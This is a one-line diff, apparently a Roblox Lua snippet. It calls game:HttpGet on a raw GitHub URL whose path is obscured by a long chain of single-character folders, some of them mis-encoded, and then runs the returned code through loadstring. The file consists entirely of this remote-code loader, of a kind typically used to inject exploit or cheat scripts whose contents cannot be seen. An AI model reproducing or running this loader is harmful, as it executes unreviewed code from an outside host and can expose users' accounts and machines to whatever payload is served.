@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Z-Eso0111/Number/main/q/w/e/r/t/y/u/Ä±/o/p/Ä/Ã¼/a/s/d/f/g/h/j/k/l/Å/i/z/x/c/v/b/n/m/Ã¶/Ã§/script'))()
